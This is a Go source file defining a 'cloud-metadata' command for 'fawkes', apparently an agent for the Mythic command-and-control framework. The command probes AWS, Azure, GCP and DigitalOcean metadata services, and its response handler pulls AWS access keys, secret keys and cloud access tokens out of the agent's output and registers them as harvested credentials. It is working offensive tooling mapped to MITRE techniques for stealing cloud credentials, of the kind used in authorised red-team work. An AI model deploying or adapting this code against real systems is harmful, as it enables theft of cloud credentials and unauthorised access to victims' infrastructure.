package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "cloud-metadata",
		Description:         "Probe cloud instance metadata services (AWS/Azure/GCP/DigitalOcean) for credentials, identity, and configuration. Supports IMDSv2 for AWS.",
		HelpString:          "cloud-metadata -action detect\ncloud-metadata -action creds\ncloud-metadata -action all -provider aws",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1552.005", "T1580"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "cloud_metadata_new.js"),
			Author:     "@galoryber",
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				Description:   "Action to perform: detect, all, creds, identity, userdata, network",
				DefaultValue:  "detect",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"detect", "all", "creds", "identity", "userdata", "network"},
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "provider",
				CLIName:       "provider",
				Description:   "Cloud provider to query (auto-detects if not specified)",
				DefaultValue:  "auto",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"auto", "aws", "azure", "gcp", "digitalocean"},
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "timeout",
				CLIName:       "timeout",
				Description:   "Per-request timeout in seconds (default: 3)",
				DefaultValue:  3,
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			hostname := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData

			// Extract AWS access keys if present
			if strings.Contains(responseText, "AccessKeyId") {
				lines := strings.Split(responseText, "\n")
				var accessKey, secretKey, roleName string
				for _, line := range lines {
					line = strings.TrimSpace(line)
					if strings.HasPrefix(line, "AccessKeyId:") {
						accessKey = strings.TrimSpace(strings.TrimPrefix(line, "AccessKeyId:"))
					} else if strings.HasPrefix(line, "SecretAccessKey:") {
						secretKey = strings.TrimSpace(strings.TrimPrefix(line, "SecretAccessKey:"))
					} else if strings.HasPrefix(line, "[+] AWS IAM Role:") {
						roleName = strings.TrimSpace(strings.TrimPrefix(line, "[+] AWS IAM Role:"))
					}
				}
				if accessKey != "" && secretKey != "" {
					account := "AWS IAM"
					if roleName != "" {
						account = fmt.Sprintf("AWS IAM (%s)", roleName)
					}
					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
						CredentialType: "key",
						Realm:          hostname,
						Account:        account,
						Credential:     fmt.Sprintf("AccessKeyId=%s SecretAccessKey=%s", accessKey, secretKey),
						Comment:        "cloud-metadata (AWS IAM)",
					})
				}
			}

			// Extract Azure/GCP tokens if present
			if strings.Contains(responseText, "access_token") {
				lines := strings.Split(responseText, "\n")
				for _, line := range lines {
					line = strings.TrimSpace(line)
					if strings.HasPrefix(line, "access_token:") || strings.HasPrefix(line, "Token:") {
						token := strings.TrimSpace(strings.SplitN(line, ":", 2)[1])
						if len(token) > 10 {
							provider := "Cloud"
							if strings.Contains(responseText, "Azure") {
								provider = "Azure"
							} else if strings.Contains(responseText, "GCP") || strings.Contains(responseText, "google") {
								provider = "GCP"
							}
							creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
								CredentialType: "token",
								Realm:          hostname,
								Account:        fmt.Sprintf("%s Managed Identity", provider),
								Credential:     token,
								Comment:        fmt.Sprintf("cloud-metadata (%s token)", provider),
							})
							break // Only capture first token
						}
					}
				}
			}

			registerCredentials(processResponse.TaskData.Task.ID, creds)
			return response
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			provider, _ := taskData.Args.GetStringArg("provider")
			display := action
			if provider != "" && provider != "auto" {
				display += fmt.Sprintf(" (%s)", provider)
			}
			response.DisplayParams = &display
			return response
		},
	})
}
